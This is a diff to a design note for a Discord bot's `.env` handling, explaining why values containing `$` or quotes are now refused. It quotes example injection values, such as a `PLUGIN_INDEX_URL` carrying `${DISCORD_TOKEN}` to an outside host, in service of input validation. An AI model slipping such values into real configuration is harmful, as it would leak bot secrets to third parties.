@@ -967,13 +967,14 @@ _Avoid_: server list, guild cache
   might echo, not a proof (a compose that echoed caller-controlled text into `log` could still act as
   a guess oracle for a stored secret; not seen, and not testable without a real compose); (6) a value
   holding a CR is refused (message names the key only) before its format regex runs, since a
-  permissive secret pattern must not let one start a new `.env` line, and a plugin key's value may
-  not contain `$` or start with a quote (after any leading whitespace, which compose trims) either
-  (compose reads a `.env` value as syntax:
-  `SPOTIFY_CLIENT_ID=${DISCORD_TOKEN}` would interpolate a core secret into a plugin's key, and a
-  leading quote opens an unterminated value that stops compose loading the file; a manifest `format`
-  such as the shipped `^\S+$` admits both, static keys' regexes already exclude them, and the check
-  covers plain plugin keys too, which `main` did not); (7) a refusal names a submitted
+  permissive secret pattern must not let one start a new `.env` line, and no key's value may contain
+  `$` or a quote ANYWHERE, static or plugin, secret or plain (compose reads a `.env` value as syntax:
+  `SPOTIFY_CLIENT_ID=${DISCORD_TOKEN}` would interpolate a core secret into a plugin's key,
+  `PLUGIN_INDEX_URL=https://host/?t=${DISCORD_TOKEN}` would send it to that host, and a quote can open a
+  value that swallows the lines after it; a manifest `format` such as the shipped `^\S+$` and the static
+  `PLUGIN_INDEX_URL` regex admit both. Not just a LEADING quote, because compose trims a wider set of
+  whitespace than bash's `[[:space:]]` — U+0085 and U+00A0 among it — before looking for one. `main`
+  checked neither; no shipped key needs either character); (7) a refusal names a submitted
   key only when it looks like a variable name (`echo_key`: upper-case, at most 40 characters), since a
   multi-line value is read line by line and a later line's text before its `=` would otherwise be
   echoed. Existing `env-get` output and every non-secret `env-schema` entry stay byte-identical for a
